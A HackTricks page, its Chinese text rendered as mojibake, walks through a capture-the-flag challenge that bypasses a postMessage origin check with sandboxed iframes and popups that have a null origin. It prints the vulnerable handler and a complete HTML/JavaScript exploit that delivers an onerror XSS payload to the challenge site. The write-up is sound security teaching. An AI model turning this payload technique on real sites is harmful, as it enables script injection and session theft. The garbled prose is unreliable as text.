# é€šè¿‡ä½¿ç”¨iframeç»•è¿‡SOP - 1

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## SOP-1ä¸­çš„Iframes

åœ¨è¿™ä¸ªç”±[**NDevTK**](https://github.com/NDevTK)å’Œ[**Terjanq**](https://github.com/terjanq)åˆ›å»ºçš„[**æŒ‘æˆ˜**](https://github.com/terjanq/same-origin-xss)ä¸­ï¼Œä½ éœ€è¦åˆ©ç”¨ä»£ç ä¸­çš„XSSæ¼æ´ã€‚
```javascript
const identifier = '4a600cd2d4f9aa1cfb5aa786';
onmessage = e => {
const data = e.data;
if (e.origin !== window.origin && data.identifier !== identifier) return;
if (data.type === 'render') {
renderContainer.innerHTML = data.body;
}
}
```
ä¸»è¦é—®é¢˜æ˜¯[**ä¸»é¡µ**](https://so-xss.terjanq.me)ä½¿ç”¨DomPurifyå‘é€`data.body`ï¼Œæ‰€ä»¥ä¸ºäº†å°†è‡ªå·±çš„htmlæ•°æ®å‘é€åˆ°è¯¥ä»£ç ä¸­ï¼Œæ‚¨éœ€è¦**ç»•è¿‡**`e.origin !== window.origin`ã€‚

è®©æˆ‘ä»¬çœ‹çœ‹ä»–ä»¬æå‡ºçš„è§£å†³æ–¹æ¡ˆã€‚

### SOPç»•è¿‡1ï¼ˆe.origin === nullï¼‰

å½“`//example.org`åµŒå…¥åˆ°**æ²™ç®±iframe**ä¸­æ—¶ï¼Œé¡µé¢çš„**æ¥æº**å°†ä¸º**`null`**ï¼Œå³**`window.origin === null`**ã€‚å› æ­¤ï¼Œåªéœ€é€šè¿‡`<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">`åµŒå…¥iframeï¼Œæˆ‘ä»¬å°±å¯ä»¥**å¼ºåˆ¶`null`æ¥æº**ã€‚

å¦‚æœé¡µé¢æ˜¯**å¯åµŒå…¥çš„**ï¼Œæ‚¨å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡è¯¥ä¿æŠ¤ï¼ˆå¯èƒ½è¿˜éœ€è¦å°†cookieè®¾ç½®ä¸º`SameSite=None`ï¼‰ã€‚

### SOPç»•è¿‡2ï¼ˆwindow.origin === nullï¼‰

è¾ƒå°‘äººçŸ¥é“çš„äº‹å®æ˜¯ï¼Œå½“è®¾ç½®äº†**æ²™ç®±å€¼`allow-popups`**æ—¶ï¼Œ**æ‰“å¼€çš„å¼¹å‡ºçª—å£**å°†**ç»§æ‰¿**æ‰€æœ‰**æ²™ç®±å±æ€§**ï¼Œé™¤éè®¾ç½®äº†`allow-popups-to-escape-sandbox`ã€‚\
å› æ­¤ï¼Œä»**nullæ¥æº**æ‰“å¼€**å¼¹å‡ºçª—å£**å°†ä½¿å¼¹å‡ºçª—å£å†…çš„**`window.origin`**ä¹Ÿå˜ä¸º**`null`**ã€‚

### æŒ‘æˆ˜è§£å†³æ–¹æ¡ˆ

å› æ­¤ï¼Œå¯¹äºè¿™ä¸ªæŒ‘æˆ˜ï¼Œå¯ä»¥**åˆ›å»º**ä¸€ä¸ª**iframe**ï¼Œ**æ‰“å¼€ä¸€ä¸ªå¼¹å‡ºçª—å£**åˆ°å…·æœ‰æ˜“å—æ”»å‡»çš„XSSä»£ç å¤„ç†ç¨‹åºï¼ˆ`/iframe.php`ï¼‰çš„é¡µé¢ï¼Œå› ä¸º`window.origin === e.origin`ï¼Œå› ä¸ºä¸¤è€…éƒ½æ˜¯`null`ï¼Œæ‰€ä»¥å¯ä»¥**å‘é€ä¸€ä¸ªå°†åˆ©ç”¨XSSçš„æœ‰æ•ˆè´Ÿè½½**ã€‚

è¯¥**æœ‰æ•ˆè´Ÿè½½**å°†è·å–**æ ‡è¯†ç¬¦**å¹¶å°†**XSS**å‘é€å›**é¡¶å±‚é¡µé¢**ï¼ˆæ‰“å¼€å¼¹å‡ºçª—å£çš„é¡µé¢ï¼‰ï¼Œ**è¯¥é¡µé¢**å°†**æ›´æ”¹ä½ç½®**åˆ°**æ˜“å—æ”»å‡»çš„**`/iframe.php`ã€‚å› ä¸ºæ ‡è¯†ç¬¦æ˜¯å·²çŸ¥çš„ï¼Œæ‰€ä»¥ä¸éœ€è¦æ»¡è¶³æ¡ä»¶`window.origin === e.origin`ï¼ˆè¯·è®°ä½ï¼Œæ¥æºæ˜¯æ¥è‡ªå…·æœ‰**æ¥æº****`null`**çš„iframeçš„å¼¹å‡ºçª—å£ï¼‰ï¼Œå› ä¸º`data.identifier === identifier`ã€‚ç„¶åï¼Œ**XSSå°†å†æ¬¡è§¦å‘**ï¼Œè¿™æ¬¡åœ¨æ­£ç¡®çš„æ¥æºä¸­ã€‚
```html
<body>
<script>
f = document.createElement('iframe');

// Needed flags
f.sandbox = 'allow-scripts allow-popups allow-top-navigation';

// Second communication with /iframe.php (this is the top page relocated)
// This will execute the alert in the correct origin
const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
},1000);`.replaceAll('\n',' ');

// Initial communication
// Open /iframe.php in a popup, both iframes and popup will have "null" as origin
// Then, bypass window.origin === e.origin to steal the identifier and communicate
// with the top with the second XSS payload
f.srcdoc = `
<h1>Click me!</h1>
<script>
onclick = e => {
let w = open('https://so-xss.terjanq.me/iframe.php');
onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
setTimeout(_ => {
w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
}, 1000);
};
<\/script>
`
document.body.appendChild(f);
</script>
</body>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
